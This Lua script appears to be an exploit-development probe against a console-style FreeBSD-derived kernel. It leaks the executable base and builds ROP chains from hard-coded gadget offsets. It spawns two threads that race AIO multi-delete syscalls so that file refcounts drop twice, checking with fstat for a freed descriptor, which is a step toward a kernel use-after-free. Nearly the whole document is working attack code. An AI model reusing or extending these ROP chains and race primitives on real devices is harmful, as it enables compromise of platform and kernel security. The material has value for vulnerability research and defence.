-- CRASH_CLASS: HIGH
-- PROBE 70e: Concurrent 662 race — measure actual file refcount impact
--
-- 70c showed: sequential double-delete = harmless (ID cleared on first delete).
-- 65l showed: concurrent double-delete = both threads get status=0 (14% hit rate).
-- Question: when both threads get status=0, does entry_dispose run TWICE?
-- If yes: file refcount decremented twice -> after enough hits, refcount underflow
-- Detect: after N race rounds, fstat(fd) returns -1 = fd freed
--
-- Uses the PROVEN 65l pattern: thr_new(455) with bare_ret start_func,
-- chain written at RSP, no socketpair gate (back-to-back spawn for maximum race).

print("=== PROBE 70e: RACE REFCOUNT IMPACT ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(N(info))) end)
local eboot_lo = rd(info + 0x108)
local eboot_hi = rd(info + 0x10C)
local EB = (eboot_hi or 0) * 0x100000000 + (eboot_lo or 0)
print("eboot=" .. string.format("0x%X", EB))

local stub = syscall.pipe.fn_addr
print("stub=" .. fmt(stub))
local pid = N(mk(20)())
print("pid=" .. pid)

-- Gadgets (same as 65l)
local g_pop_rax = uint64(EB + 0x992)
local g_pop_rdi = uint64(EB + 0xC9DFE)
local g_pop_rsi = uint64(EB + 0xD77D)
local g_pop_rdx = uint64(EB + 0x3B02D7)
local g_bare_ret = uint64(EB + 0x42)
local g_mov_m_rax = uint64(EB + 0x92C67) -- mov [rdi],rax;ret

-- /dev/zero
local zero_path = memory.alloc(16)
for c = 1, 9 do pcall(function() memory.write_byte(zero_path + c - 1, string.byte("/dev/zero", c)) end) end
pcall(function() memory.write_byte(zero_path + 9, 0) end)

-- Open test fd shared across ALL rounds
local ok, test_fd_v = pcall(function() return mk(5)(uint64(N(zero_path)), uint64(0)) end)
local test_fd = N(test_fd_v)
print("test_fd=" .. test_fd)

local stat_buf = memory.alloc(256)
local ok2, fret = pcall(function() return mk(189)(uint64(test_fd), uint64(N(stat_buf))) end)
print(string.format("baseline fstat(%d)=%d", test_fd, ok2 and N(fret) or -999))
print("")

local BATCH = 16
local ROUNDS = 30
local total_doubles = 0
local fd_broken = false

print("[A] " .. ROUNDS .. " race rounds, " .. BATCH .. " IDs each")
print("    2 children per round, back-to-back spawn (65l pattern)")
print("")

for round = 1, ROUNDS do
    if fd_broken then break end

    -- Submit BATCH AIO requests on test_fd
    local aio_ids = {}
    local data_buf = memory.alloc(64)
    local result_buf = memory.alloc(8)
    local ids_buf = memory.alloc(8)
    for i = 1, BATCH do
        local req = memory.alloc(0x28)
        wq(req + 0x00, uint64(0))
        wq(req + 0x08, uint64(16))
        wq(req + 0x10, uint64(N(data_buf)))
        wq(req + 0x18, uint64(N(result_buf)))
        wq(req + 0x20, uint64(test_fd))
        wd(ids_buf, 0)
        pcall(function()
            mk(669)(uint64(1), uint64(N(req)), uint64(1), uint64(1), uint64(N(ids_buf)))
        end)
        local aid = rd(ids_buf)
        if aid and aid ~= 0 then aio_ids[#aio_ids + 1] = aid end
    end

    -- Poll all
    local st_buf = memory.alloc(8)
    for _, aid in ipairs(aio_ids) do
        wd(ids_buf, aid)
        pcall(function() mk(664)(uint64(N(ids_buf)), uint64(1), uint64(N(st_buf))) end)
    end

    local count = #aio_ids
    if count < 1 then
        print(string.format("  round %d: 0 IDs, skip", round))
    else
        -- Shared ID array
        local del_ids = memory.alloc(count * 4 + 8)
        for j = 1, count do wd(N(del_ids) + (j-1)*4, aio_ids[j]) end

        -- State/marker buffers
        local states_A = memory.alloc(count * 4 + 8)
        local states_B = memory.alloc(count * 4 + 8)
        for j = 0, count * 4, 4 do wd(N(states_A) + j, 0xDEAD); wd(N(states_B) + j, 0xDEAD) end
        local marker_A = memory.alloc(8); wq(marker_A, uint64(0))
        local marker_B = memory.alloc(8); wq(marker_B, uint64(0))

        -- Build child A ROP chain (65l pattern exactly)
        local stk_A = memory.alloc(0x4000)
        local sb_A = N(stk_A)
        local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
        local oA = 0
        local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
        -- Write marker
        emA(g_pop_rax); emA(uint64(0x41414141))
        emA(g_pop_rdi); emA(uint64(N(marker_A)))
        emA(g_mov_m_rax)
        -- 662(del_ids, count, states_A)
        emA(g_pop_rdi); emA(uint64(N(del_ids)))
        emA(g_pop_rsi); emA(uint64(count))
        emA(g_pop_rdx); emA(uint64(N(states_A)))
        emA(g_pop_rax); emA(uint64(662))
        emA(stub)
        -- thr_exit(431)
        emA(g_pop_rdi); emA(uint64(0))
        emA(g_pop_rax); emA(uint64(431))
        emA(stub)

        -- Build child B ROP chain
        local stk_B = memory.alloc(0x4000)
        local sb_B = N(stk_B)
        local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
        for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
        local oB = 0
        local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
        emB(g_pop_rax); emB(uint64(0x42424242))
        emB(g_pop_rdi); emB(uint64(N(marker_B)))
        emB(g_mov_m_rax)
        emB(g_pop_rdi); emB(uint64(N(del_ids)))
        emB(g_pop_rsi); emB(uint64(count))
        emB(g_pop_rdx); emB(uint64(N(states_B)))
        emB(g_pop_rax); emB(uint64(662))
        emB(stub)
        emB(g_pop_rdi); emB(uint64(0))
        emB(g_pop_rax); emB(uint64(431))
        emB(stub)

        -- thr_new params
        local par_A = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
        wq(N(par_A), g_bare_ret)          -- start_func = ret
        wq(N(par_A) + 0x10, uint64(sb_A)) -- stack_base
        wq(N(par_A) + 0x18, uint64(0x2000)) -- stack_size
        local tA = memory.alloc(8); wq(N(tA), uint64(0))
        wq(N(par_A) + 0x30, tA)

        local par_B = memory.alloc(0x40)
        for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
        wq(N(par_B), g_bare_ret)
        wq(N(par_B) + 0x10, uint64(sb_B))
        wq(N(par_B) + 0x18, uint64(0x2000))
        local tB = memory.alloc(8); wq(N(tB), uint64(0))
        wq(N(par_B) + 0x30, tB)

        -- Spawn both back-to-back (maximum race window)
        pcall(function() mk(455)(par_A, uint64(0x38)) end)
        pcall(function() mk(455)(par_B, uint64(0x38)) end)

        -- Wait for children
        for w = 1, 500000 do local _ = rd(sb_A) end

        -- Count doubles
        local doubles = 0
        for j = 0, count - 1 do
            local sa = rd(N(states_A) + j * 4)
            local sb2 = rd(N(states_B) + j * 4)
            if sa == 0 and sb2 == 0 then doubles = doubles + 1 end
        end
        total_doubles = total_doubles + doubles

        -- Check fd health via fstat
        local ok3, fs = pcall(function() return mk(189)(uint64(test_fd), uint64(N(stat_buf))) end)
        local fstat_ret = ok3 and N(fs) or -999

        -- Also try read
        local rbuf = memory.alloc(16)
        local ok4, rr = pcall(function() return mk(3)(uint64(test_fd), uint64(N(rbuf)), uint64(8)) end)
        local read_ret = ok4 and N(rr) or -999

        if doubles > 0 or round % 5 == 0 or fstat_ret ~= 0 then
            print(string.format("  round %d: %d/%d doubles fstat=%d read=%d cumul=%d",
                round, doubles, count, fstat_ret, read_ret, total_doubles))
        end

        if fstat_ret ~= 0 then
            print(string.format("  *** FD BROKEN at round %d! fstat=%d total_doubles=%d ***", round, fstat_ret, total_doubles))
            fd_broken = true
        end
    end
end

print("")
print(string.format("RESULT: %d doubles / %d IDs across %d rounds", total_doubles, BATCH * ROUNDS, ROUNDS))
print(string.format("fd_broken=%s", tostring(fd_broken)))

local ok5, fs5 = pcall(function() return mk(189)(uint64(test_fd), uint64(N(stat_buf))) end)
print(string.format("final fstat(%d)=%d", test_fd, ok5 and N(fs5) or -999))

print("alive=YES")
print("=== PROBE 70e COMPLETE ===")
